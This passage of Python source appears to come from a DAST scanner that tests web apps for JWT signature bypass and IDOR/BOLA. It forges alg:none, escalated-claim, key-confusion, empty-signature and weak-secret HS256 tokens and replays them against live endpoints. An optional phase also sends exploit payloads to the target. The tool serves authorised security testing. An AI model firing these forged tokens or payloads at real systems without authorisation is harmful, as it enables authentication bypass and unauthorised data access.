            return self.replay_callback_signature_forgery(spec, target, accounts=accounts)
        header_name = str(spec.get("auth_header_name") or spec.get("token_header") or "Authorization").strip()
        scheme = str(spec.get("auth_scheme") or "Bearer").strip()
        token = spec.get("jwt_token") or spec.get("token") or ""
        if not token and isinstance(accounts, dict):
            for role in ("admin", "attacker", "victim"):
                tok = (accounts.get(role) or {}).get("jwt_token") or (accounts.get(role) or {}).get("token")
                if tok:
                    token = tok
                    break
        if not token or token.count(".") < 2:
            return {
                "confirmed": False, "verdict": "no_evidence",
                "reason": "spec/accounts 未提供可解析的 JWT token，无法执行签名绕过重放",
                "variants_tried": 0, "confirmed_variants": [],
            }
        try:
            hdr_b64, payload_b64, _sig = token.split(".", 2)
            hdr = json.loads(self._b64url_decode(hdr_b64))
            payload = json.loads(self._b64url_decode(payload_b64))
        except Exception as exc:  # noqa: BLE001
            return {"confirmed": False, "verdict": "no_evidence", "reason": f"JWT 解析失败：{exc}",
                    "variants_tried": 0, "confirmed_variants": []}
        orig_alg = str(hdr.get("alg") or "HS256")
        public_key = spec.get("public_key_pem") or target.get("jwt_public_key") or ""

        variants: List[tuple] = []
        none_hdr = {"alg": "none", "typ": "JWT"}
        variants.append(("alg:none (原 payload)", self._forge_none(none_hdr, payload)))
        esc = dict(payload)
        for claim, val in (spec.get("escalation_claims") or {"role": "admin", "isAdmin": True, "admin": True}).items():
            esc[claim] = val
        variants.append(("alg:none + 提权", self._forge_none(none_hdr, esc)))
        if orig_alg.startswith(("RS", "ES")) and public_key:
            variants.append(("HS256 密钥混淆(公钥为密钥)",
                             self._forge_hs256({"alg": "HS256", "typ": "JWT"}, payload, public_key)))
        broken_hdr = dict(hdr)
        variants.append((f"{orig_alg} 空签名",
                         f"{self._b64url_encode(json.dumps(broken_hdr, separators=(',', ':')).encode())}.{payload_b64}."))
        wordlist = spec.get("weak_secret_wordlist") or _WEAK_JWT_SECRETS
        if spec.get("brute_weak_secret", True):
            for secret in wordlist:
                variants.append((f"HS256 弱密钥:{secret}",
                                 self._forge_hs256({"alg": "HS256", "typ": "JWT"}, payload, secret)))

        control_token = "invalid.invalid.invalid"
        results: List[Dict[str, Any]] = []
        confirmed = False
        confirmed_variants: List[str] = []
        for label, ftok in variants:
            spec_v = dict(spec)
            spec_v["auth_context"] = {"auth_headers": {header_name: f"{scheme} {ftok}"}}
            method, url, query, headers, cookies, body, ct = self._assemble(target, spec_v)
            impact = self._send_one(method, url, query, headers, cookies, body, ct)
            accepted = bool(impact.reached and impact.status_code and 200 <= int(impact.status_code) < 300
                            and not self._denied(impact.body or ""))
            results.append({"variant": label, "accepted": accepted, "status_code": impact.status_code,
                           "summary": impact.response_summary})
            if accepted:
                confirmed = True
                confirmed_variants.append(label)

        spec_c = dict(spec)
        spec_c["auth_context"] = {"auth_headers": {header_name: f"{scheme} {control_token}"}}
        method, url, query, headers, cookies, body, ct = self._assemble(target, spec_c)
        control_impact = self._send_one(method, url, query, headers, cookies, body, ct)
        control_accepted = bool(control_impact.reached and control_impact.status_code
                                and 200 <= int(control_impact.status_code) < 300
                                and not self._denied(control_impact.body or ""))

        ai = self._ai_overlay_judgement("signature_bypass", spec, control_impact)
        heuristic = confirmed
        final = ai if ai is not None else heuristic
        if confirmed:
            reason = "签名绕过确认：受保护端点接受伪造/缺失签名的 JWT" + (
                "（控制组非法 token 亦被接受，说明完全不校验签名）" if control_accepted
                else f"（绕过变体：{', '.join(confirmed_variants)}；控制组被拒，说明仅绕过变体有效）")
        else:
            reason = "所有签名绕过变体均被服务端拒绝，未发现签名校验缺失"
        return {
            "confirmed": final,
            "verdict": "confirmed" if final else "no_evidence",
            "control_accepted": control_accepted,
            "confirmed_variants": confirmed_variants,
            "original_alg": orig_alg,
            "variants_tried": len(variants),
            "variant_results": results,
            "heuristic_confirmed": heuristic,
            "ai_overlay": ai,
            "status_code": (results[-1].get("status_code") if results else None),
            "reason": reason,
        }

    @staticmethod
    def _phase2_allowed(target: Dict[str, Any], spec: Dict[str, Any]) -> bool:
        """默认关闭。需 phase2_enabled=True 且目标在白名单 + spec 显式 override。"""
        settings = (target.get("settings") or {}) if isinstance(target.get("settings"), dict) else {}
        if not settings.get("phase2_enabled"):
            return False
        whitelist = settings.get("phase2_whitelist") or []
        base = str(target.get("service_url") or "").rstrip("/")
        if whitelist and base not in whitelist:
            return False
        # spec 必须显式带 phase2 override 与 impact_payloads
        if not spec.get("phase2_override"):
            return False
        return bool(spec.get("impact_payloads"))

    def _send_phase2(self, method: str, url: str, headers: Dict[str, str], cookies: Dict[str, str],
                     query: Dict[str, str], body: Any, content_type: str, spec: Dict[str, Any]) -> List[Dict[str, Any]]:
        """ Phase 2：用 high_impact_payloads 真打 exploit、看响应是否如预期影响。
        复用 Phase1 的 auth/路由，仅替换 body 字段值。"""
        results: List[Dict[str, Any]] = []
        for idx, payload in enumerate(spec.get("impact_payloads") or []):
            phase2_body = dict(body or {}) if isinstance(body, dict) else {}
            payload_str = str(payload)
            phase2_body["payload"] = payload_str
            try:
                resp = requests.request(
                    method=method, url=url, params=query or None,
                    headers=headers or None, cookies=cookies or None,
                    data=phase2_body if "form" in content_type.lower() else None,
                    json=None if "form" in content_type.lower() else phase2_body,
                    timeout=10, allow_redirects=False,
                )
                results.append({
                    "status_code": resp.status_code,
                    "body": (resp.text or "")[:1000],
                    "impact_payload": payload_str,
                })
            except Exception as exc:
                results.append({"impact_payload": payload_str, "error": str(exc)})
        return results

    def results(self, app_id: str) -> Dict[str, Any]:
        row = self.db.execute("SELECT id FROM dast_scan_runs WHERE app_id = ? ORDER BY id DESC LIMIT 1", (app_id,), fetchone=True)
        if not row:
            return {"app_id": app_id, "finding_count": 0, "findings": []}
        findings = self.run_findings(int(row["id"]))
        return {"app_id": app_id, "run_id": row["id"], "finding_count": len(findings), "findings": findings}

    def runs(self, app_id: str) -> List[Dict[str, Any]]:
        rows = self.db.execute("SELECT * FROM dast_scan_runs WHERE app_id = ? ORDER BY id DESC", (app_id,), fetchall=True) or []
        return [dict(row) | {"summary": Database.loads(row["summary_json"])} for row in rows]

    def run_findings(self, run_id: int) -> List[Dict[str, Any]]:
        rows = self.db.execute("SELECT * FROM dast_findings WHERE run_id = ? ORDER BY id", (run_id,), fetchall=True) or []
        return [Database.loads(row["finding_json"]) | {"id": row["id"], "run_id": row["run_id"], "decision": Database.loads(row["decision_json"]), "evidence": Database.loads(row["evidence_json"])} for row in rows]

    def _normalize_sample(self, app_id: str, item: Dict[str, Any], index: int) -> Dict[str, Any]:
        request = item.get("request") or {}
        if isinstance(request, str):
            request = self._parse_raw_request(request)
        if item.get("raw_request"):
            request = self._parse_raw_request(str(item.get("raw_request")))
        method = str(item.get("method") or request.get("method") or "GET").upper()
        path = item.get("api_path") or item.get("path") or request.get("path") or "/"
        response = item.get("response") or {}
        if isinstance(response, str):
            response = self._parse_raw_response(response)
        status_code = int(item.get("status_code") or response.get("status_code") or self._status_from_summary(item.get("response_summary", "")) or 0)
        body = str(item.get("response_body") or response.get("body") or item.get("response_summary") or "")
        api = self._match_api(app_id, method, path)
        return {
            "api_id": api.get("id") if api else None,
            "sample_key": item.get("sample_key") or f"{method} {path} #{index + 1}",
            "method": method,
            "path": path,
            "role": item.get("role", ""),
            "tenant": item.get("tenant", ""),
            "subject": item.get("subject") or item.get("user_id") or item.get("role", ""),
            "resource_owner": item.get("resource_owner", ""),
            "resource_tenant": item.get("resource_tenant") or item.get("tenant", ""),
            "resource_id": str(item.get("resource_id") or self._extract_resource_id(path) or ""),
            "request": {**request, "method": method, "path": path},
            "response": {**response, "status_code": status_code, "body": body},
            "status_code": status_code,
            "response_body": body,
            "source": item.get("source", "manual"),
        }

    def _build_candidates(self, apis: List[Dict[str, Any]], samples: List[Dict[str, Any]], accounts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        candidates: List[Dict[str, Any]] = []
        for api in apis:
            related = [s for s in samples if s.get("api_id") == api.get("id") or self._path_match(api.get("path", ""), s.get("path", ""))]
            for original in related:
                for unauthorized in related:
                    if original.get("id") == unauthorized.get("id") or not self._cross_boundary(original, unauthorized):
                        continue
                    candidates.append({"api": api, "original_sample": original, "unauthorized_sample": unauthorized, "attacker_account": self._account_for(accounts, unauthorized)})
            for original in related:
                for account in accounts:
                    if account.get("subject") and account.get("subject") != original.get("resource_owner"):
                        candidates.append({"api": api, "original_sample": original, "unauthorized_sample": self._mutated_sample(original, account), "attacker_account": account})
        return self._dedupe_candidates(candidates)

    def _execute_candidate(self, app: Dict[str, Any], candidate: Dict[str, Any]) -> Dict[str, Any]:
        sample = candidate.get("unauthorized_sample") or {}
        request = dict(sample.get("request") or {})
        account = candidate.get("attacker_account") or {}
        headers = {**dict(request.get("headers") or {}), **dict(account.get("auth_headers") or {})}
        cookies = {**dict(request.get("cookies") or {}), **dict(account.get("auth_cookies") or {})}
        url = urljoin(str(app.get("base_url") or "").rstrip("/") + "/", str(request.get("path") or sample.get("path") or "/").lstrip("/"))
        try:
            response = requests.request(
                method=str(request.get("method") or sample.get("method") or "GET"),
                url=url,
                headers=headers,
                cookies=cookies,
                data=request.get("body") or None,
                timeout=10,
                allow_redirects=False,
            )
            sample = dict(sample)
            sample["response"] = {"status_code": response.status_code, "headers": dict(response.headers), "body": response.text[:20000]}
            sample["status_code"] = response.status_code
            sample["response_body"] = response.text[:20000]
            sample["source"] = "live_replay"
            candidate = dict(candidate)
            candidate["unauthorized_sample"] = sample
        except Exception as exc:
            candidate = dict(candidate)
            candidate["replay_error"] = str(exc)
        return candidate

    def _build_evidence(self, app: Dict[str, Any], candidate: Dict[str, Any]) -> Dict[str, Any]:
        original = candidate.get("original_sample") or {}
        unauthorized = candidate.get("unauthorized_sample") or {}
        attacker = candidate.get("attacker_account") or {}
        compare = self._compare_responses(original, unauthorized)
        return {
            "app": {k: app.get(k) for k in ("app_id", "app_name", "base_url", "service_name", "auth_type")},
            "api": candidate.get("api") or {},
            "attacker": {k: attacker.get(k, "") for k in ("account_id", "role", "tenant", "subject")},
            "original_sample": original,
            "unauthorized_sample": unauthorized,
            "comparison": compare,
            "request_succeeded": compare.get("unauthorized_succeeded", False),
            "should_succeed": self._should_succeed(app, original, unauthorized, attacker),
            "role_boundaries": app.get("role_boundaries") or [],
            "replay_error": candidate.get("replay_error", ""),
        }

    def _ai_decision(self, evidence: Dict[str, Any]) -> Dict[str, Any]:
        original = evidence.get("original_sample") or {}
        unauthorized = evidence.get("unauthorized_sample") or {}
        comparison = evidence.get("comparison") or {}
        request_succeeded = bool(evidence.get("request_succeeded"))
        should_succeed = bool(evidence.get("should_succeed"))
        missing = []
        if not unauthorized.get("response_body") and not unauthorized.get("status_code"):
            missing.append("unauthorized response evidence")
        if not original.get("resource_owner") and not original.get("resource_tenant"):
            missing.append("resource ownership or tenant evidence")
        if not evidence.get("role_boundaries"):
            missing.append("configured role boundary")
        is_idor = request_succeeded and not should_succeed and not evidence.get("replay_error")
        confidence = "high" if is_idor and comparison.get("body_similarity", 0) >= 0.35 else ("medium" if is_idor else "low")
        return {
            "model": "local-policy-ai-decision",
            "prompt_version": "idor-terminal-first-v2",
            "request_succeeded": request_succeeded,
            "should_succeed": should_succeed,
            "is_idor": is_idor,
            "confidence": confidence,
            "decision_reason": self._decision_reason(is_idor, request_succeeded, should_succeed, missing),
            "missing_evidence": missing,
            "acceptance_criteria": ["cross_subject_resource_access", "unauthorized_response_success"] if is_idor else [],
            "rejection_criteria": [] if is_idor else (["request_blocked_or_business_denied"] if not request_succeeded else ["configured_boundary_allows_access"]),
            "comparison": comparison,
        }

    def _finding_from_decision(self, app: Dict[str, Any], api: Dict[str, Any], evidence: Dict[str, Any], decision: Dict[str, Any]) -> Dict[str, Any]:
        sample = evidence.get("original_sample") or {}
        finding = {
            "type": "IDOR",
            "display_title": f"IDOR: {api.get('method')} {api.get('path')}",
            "display_family": "idor",
            "severity": "HIGH" if api.get("method") in {"POST", "PUT", "PATCH", "DELETE"} else "MEDIUM",
            "file": app.get("app_name") or app.get("app_id"),
            "line": 0,
            "description": "DAST replay shows cross-subject or cross-tenant access outside configured authorization boundaries.",
            "fix": "Enforce owner, tenant and permission checks at resource lookup and before side effects.",
            "source": "dast-idor",
            "idor": {
                "app_id": app.get("app_id"),
                "api": api,
                "resource_id": sample.get("resource_id", ""),
                "resource_owner": sample.get("resource_owner", ""),
                "attacker": evidence.get("attacker") or {},
                "original_request": sample.get("request") or {},
                "unauthorized_request": (evidence.get("unauthorized_sample") or {}).get("request") or {},
                "original_response_summary": self._response_summary(sample),
                "unauthorized_response_summary": self._response_summary(evidence.get("unauthorized_sample") or {}),
                **decision,
            },
        }
        return enrich_finding_hash(finding)

    def _persist_finding(self, run_id: int, app_id: str, api_id: Optional[int], finding: Dict[str, Any], evidence: Dict[str, Any], decision: Dict[str, Any]) -> None:
        self.db.execute(
            """
            INSERT INTO dast_findings
            (run_id, app_id, api_id, vulnerability_hash_v2, severity, title, decision_json, evidence_json, finding_json, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                run_id,
                app_id,
                api_id,
                finding.get("vulnerability_hash_v2", ""),
                finding.get("severity", "HIGH"),
                finding.get("display_title", "IDOR"),
                self.db.dumps(decision),
                self.db.dumps(evidence),
                self.db.dumps(finding),
                datetime.utcnow().isoformat(),
            ),
        )

    def _compare_responses(self, original: Dict[str, Any], unauthorized: Dict[str, Any]) -> Dict[str, Any]:
        original_body = str(original.get("response_body") or ((original.get("response") or {}).get("body")) or "")
        unauth_body = str(unauthorized.get("response_body") or ((unauthorized.get("response") or {}).get("body")) or "")
        status_code = int(unauthorized.get("status_code") or ((unauthorized.get("response") or {}).get("status_code")) or 0)
        return {
            "original_status_code": int(original.get("status_code") or ((original.get("response") or {}).get("status_code")) or 0),
            "unauthorized_status_code": status_code,
            "unauthorized_succeeded": self._success_status(status_code, unauth_body),
            "body_similarity": self._body_similarity(original_body, unauth_body),
            "shared_resource_marker": bool(original.get("resource_id") and str(original.get("resource_id")) in unauth_body),
            "denial_signal": any(word in unauth_body.lower() for word in self.DENY_WORDS),
        }

    def _should_succeed(self, app: Dict[str, Any], original: Dict[str, Any], unauthorized: Dict[str, Any], attacker: Dict[str, Any]) -> bool:
        attacker_subject = attacker.get("subject") or unauthorized.get("subject") or unauthorized.get("role")
        attacker_role = attacker.get("role") or unauthorized.get("role")
        attacker_tenant = attacker.get("tenant") or unauthorized.get("tenant")
        owner = original.get("resource_owner") or original.get("subject")
        tenant = original.get("resource_tenant") or original.get("tenant")
        if owner and attacker_subject and owner == attacker_subject:
            return True
        if tenant and attacker_tenant and tenant != attacker_tenant:
            return False
        for boundary in app.get("role_boundaries") or []:
            roles = boundary.get("roles") or boundary.get("allow_roles") or []
            tenants = boundary.get("tenants") or boundary.get("allow_tenants") or []
            if roles and attacker_role not in roles:
                continue
            if tenants and attacker_tenant not in tenants:
                continue
            if boundary.get("allow_cross_subject") is True:
                return True
        if owner and attacker_subject and owner != attacker_subject:
            return False
        return bool(tenant and attacker_tenant and tenant == attacker_tenant and not owner)

    def _mutated_sample(self, original: Dict[str, Any], account: Dict[str, Any]) -> Dict[str, Any]:
        request = dict(original.get("request") or {})
        request["headers"] = {**dict(request.get("headers") or {}), **dict(account.get("auth_headers") or {})}
        request["cookies"] = {**dict(request.get("cookies") or {}), **dict(account.get("auth_cookies") or {})}
        return {**original, "id": f"mutated-{original.get('id')}-{account.get('account_id')}", "role": account.get("role", ""), "tenant": account.get("tenant", ""), "subject": account.get("subject", ""), "request": request, "response": {}, "status_code": 0, "response_body": "", "source": "mutated_request"}

    def _cross_boundary(self, original: Dict[str, Any], unauthorized: Dict[str, Any]) -> bool:
        if original.get("resource_id") and unauthorized.get("resource_id") and original.get("resource_id") != unauthorized.get("resource_id"):
            return False
        if original.get("resource_owner") and unauthorized.get("subject") and original.get("resource_owner") != unauthorized.get("subject"):
            return True
        if original.get("resource_tenant") and unauthorized.get("tenant") and original.get("resource_tenant") != unauthorized.get("tenant"):
            return True
        return bool(original.get("role") and unauthorized.get("role") and original.get("role") != unauthorized.get("role"))

    def _skip_api(self, api: Dict[str, Any]) -> bool:
        path = str(api.get("path", "")).lower()
        if any(token in path for token in self.SKIP_PATH_TOKENS):
            return True
        return not (api.get("params") or api.get("resource_id_fields") or "{" in path or ":" in path)

    def _match_api(self, app_id: str, method: str, path: str) -> Optional[Dict[str, Any]]:
        for api in self.list_apis(app_id):
            if api.get("method") == method and self._path_match(api.get("path", ""), path):
                return api
        return None

    @staticmethod
    def _path_match(template: str, path: str) -> bool:
        if template == path:
            return True
        pattern = re.sub(r"\{[^/]+\}", r"[^/]+", template)
        pattern = re.sub(r":[^/]+", r"[^/]+", pattern)
        return bool(re.fullmatch(pattern.strip("/"), str(path).strip("/")))

    @staticmethod
    def _extract_resource_id(path: str) -> str:
        for part in reversed([p for p in str(path).split("/") if p]):
            if re.search(r"\d|[0-9a-fA-F-]{8,}", part):
                return part
        return ""

    @staticmethod
    def _infer_resource_fields(path: str, item: Dict[str, Any]) -> List[str]:
        fields = re.findall(r"\{([^/{}]+)\}", str(path)) + re.findall(r":([A-Za-z0-9_]+)", str(path))
        for param in item.get("params") or item.get("parameters") or []:
            name = param.get("name") if isinstance(param, dict) else str(param)
            if any(token in str(name).lower() for token in ("id", "user", "tenant", "owner", "account", "order")):
                fields.append(str(name))
        return list(dict.fromkeys(fields))

    @staticmethod
    def _risk_level(method: str, path: str) -> str:
        if method in {"POST", "PUT", "PATCH", "DELETE"}:
            return "high"
        return "high" if any(t in path.lower() for t in ("admin", "order", "account", "user", "tenant", "invoice", "payment")) else "medium"

    def _apis_from_openapi(self, document: Dict[str, Any]) -> List[Dict[str, Any]]:
        apis = []
        for path, methods in (document.get("paths") or {}).items():
            for method, spec in (methods or {}).items():
                if method.lower() not in {"get", "post", "put", "patch", "delete", "head", "options"}:
                    continue
                spec = spec or {}
                apis.append({"method": method.upper(), "path": path, "operation_id": spec.get("operationId", ""), "description": spec.get("summary") or spec.get("description", ""), "params": spec.get("parameters", []), "body_schema": spec.get("requestBody") or {}, "tags": spec.get("tags", []), "auth_required": bool(spec.get("security", True))})
        return apis

    def _apis_from_postman(self, collection: Dict[str, Any]) -> List[Dict[str, Any]]:
        apis = []
        def walk(items: Iterable[Dict[str, Any]]) -> None:
            for item in items or []:
                if item.get("item"):
                    walk(item.get("item") or [])
                    continue
                request = item.get("request") or {}
                url = request.get("url") or {}
                raw = url.get("raw") if isinstance(url, dict) else str(url)
                path = "/" + "/".join(url.get("path") or []) if isinstance(url, dict) and url.get("path") else re.sub(r"^https?://[^/]+", "", raw or "/")
                apis.append({"method": str(request.get("method") or "GET").upper(), "path": path or "/", "description": item.get("name", ""), "params": []})
        walk(collection.get("item") or [])
        return apis

    @staticmethod
    def _parse_raw_request(raw: str) -> Dict[str, Any]:
        lines = raw.replace("\r\n", "\n").split("\n")
        first = lines[0].split() if lines else []
        method = first[0].upper() if first else "GET"
        path = first[1] if len(first) > 1 else "/"
        headers: Dict[str, str] = {}
        body_lines = []
        in_body = False
        for line in lines[1:]:
            if in_body:
                body_lines.append(line)
            elif not line.strip():
                in_body = True
            elif ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()
        return {"method": method, "path": path, "headers": headers, "body": "\n".join(body_lines)}

    @staticmethod
    def _parse_raw_response(raw: str) -> Dict[str, Any]:
        lines = raw.replace("\r\n", "\n").split("\n")
        status = D1Service._status_from_summary(lines[0] if lines else "")
        headers: Dict[str, str] = {}
        body_lines = []
        in_body = False
        for line in lines[1:]:
            if in_body:
                body_lines.append(line)
            elif not line.strip():
                in_body = True
            elif ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()
        return {"status_code": status, "headers": headers, "body": "\n".join(body_lines)}

    @staticmethod
    def _status_from_summary(summary: Any) -> int:
        match = re.search(r"\b([1-5]\d{2})\b", str(summary or ""))
        return int(match.group(1)) if match else 0

    def _success_status(self, status_code: int, body: str) -> bool:
        lowered = (body or "").lower()
        if any(word in lowered for word in self.DENY_WORDS):
            return False
        if 200 <= int(status_code or 0) < 300:
            return True
        return any(word in lowered for word in self.SUCCESS_WORDS)

    @staticmethod
    def _body_similarity(a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        tokens_a = set(re.findall(r"[A-Za-z0-9_\u4e00-\u9fff]{2,}", a.lower()))
        tokens_b = set(re.findall(r"[A-Za-z0-9_\u4e00-\u9fff]{2,}", b.lower()))
        return round(len(tokens_a & tokens_b) / len(tokens_a | tokens_b), 4) if tokens_a and tokens_b else 0.0

    @staticmethod
    def _response_summary(sample: Dict[str, Any]) -> str:
        status = sample.get("status_code") or ((sample.get("response") or {}).get("status_code")) or 0
        body = str(sample.get("response_body") or ((sample.get("response") or {}).get("body")) or "")[:300]
        return f"status={status}; body={body}"

    @staticmethod
    def _decision_reason(is_idor: bool, request_succeeded: bool, should_succeed: bool, missing: List[str]) -> str:
        if is_idor:
            return "Unauthorized replay succeeded and configured ownership/tenant/role boundaries do not justify access."
        if not request_succeeded:
            return "Unauthorized replay did not produce a business-success response."
        if should_succeed:
            return "Configured role or tenant boundary allows this request."
        return "Evidence is incomplete: " + ", ".join(missing)

    @staticmethod
    def _dedupe_candidates(candidates: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        seen = set()
        result = []
        for item in candidates:
            key = ((item.get("api") or {}).get("id"), (item.get("original_sample") or {}).get("id"), (item.get("unauthorized_sample") or {}).get("id"), (item.get("attacker_account") or {}).get("account_id"))
            if key in seen:
                continue
            seen.add(key)
            result.append(item)
        return result

    @staticmethod
    def _account_for(accounts: List[Dict[str, Any]], sample: Dict[str, Any]) -> Dict[str, Any]:
        for account in accounts:
            if account.get("role") == sample.get("role") and (not sample.get("tenant") or account.get("tenant") == sample.get("tenant")):
                return account
        return {"role": sample.get("role", ""), "tenant": sample.get("tenant", ""), "subject": sample.get("subject", "")}

    @staticmethod
    def _safe_id(value: Any) -> str:
        text = re.sub(r"[^A-Za-z0-9_.-]+", "-", str(value or "app").strip()).strip("-")
        return text or "app"

    @staticmethod
    def _app_row(row) -> Dict[str, Any]:
        return {"app_id": row["app_id"], "app_name": row["app_name"], "base_url": row["base_url"], "service_name": row["service_name"], "auth_type": row["auth_type"], "role_boundaries": Database.loads(row["role_boundaries_json"]), "settings": Database.loads(row["settings_json"]), "created_at": row["created_at"], "updated_at": row["updated_at"]}

    @staticmethod
    def _account_row(row) -> Dict[str, Any]:
        _headers = Database.loads(row["auth_headers_json"])
        _cookies = Database.loads(row["auth_cookies_json"])
        acct = {"id": row["id"], "app_id": row["app_id"], "account_id": row["account_id"], "role": row["role"], "tenant": row["tenant"], "subject": row["subject"], "auth_headers": _headers, "auth_cookies": _cookies, "token_ref": row["token_ref"], "metadata": Database.loads(row["metadata_json"]), "created_at": row["created_at"]}
        # 账户也能参与 replay_bola 的 VICTIM_FROM_POOL 哨兵解析（否则只能退化为盲投 "1"）。
        # 仅在 JWT payload 真含 uid/sub/user_id 时写入，绝不猜测。
        _tok = ""
        if isinstance(_cookies, dict):
            for _v in _cookies.values():
                if isinstance(_v, str) and _v.count(".") >= 2:
                    _tok = _v
                    break
        if not _tok and isinstance(_headers, dict):
            for _v in _headers.values():
                if isinstance(_v, str) and _v.count(".") >= 2:
                    _tok = _v.split(" ")[-1]
                    break
        if _tok:
            _uid = _decode_jwt_uid(_tok)
            if _uid is not None:
                acct["user_id"] = str(_uid)
        return acct

    @staticmethod
    def _api_row(row) -> Dict[str, Any]:
        return {"id": row["id"], "app_id": row["app_id"], "api_key": row["api_key"], "method": row["method"], "path": row["path"], "operation_id": row["operation_id"], "description": row["description"], "params": Database.loads(row["params_json"]), "body_schema": Database.loads(row["body_schema_json"]), "resource_id_fields": Database.loads(row["resource_id_fields_json"]), "auth_required": bool(row["auth_required"]), "risk_level": row["risk_level"], "tags": Database.loads(row["tags_json"]), "created_at": row["created_at"]}

    @staticmethod
    def _sample_row(row) -> Dict[str, Any]:
        return {"id": row["id"], "app_id": row["app_id"], "api_id": row["api_id"], "sample_key": row["sample_key"], "method": row["method"], "path": row["path"], "role": row["role"], "tenant": row["tenant"], "subject": row["subject"], "resource_owner": row["resource_owner"], "resource_tenant": row["resource_tenant"], "resource_id": row["resource_id"], "request": Database.loads(row["request_json"]), "response": Database.loads(row["response_json"]), "status_code": row["status_code"], "response_body": row["response_body"], "source": row["source"], "created_at": row["created_at"]}
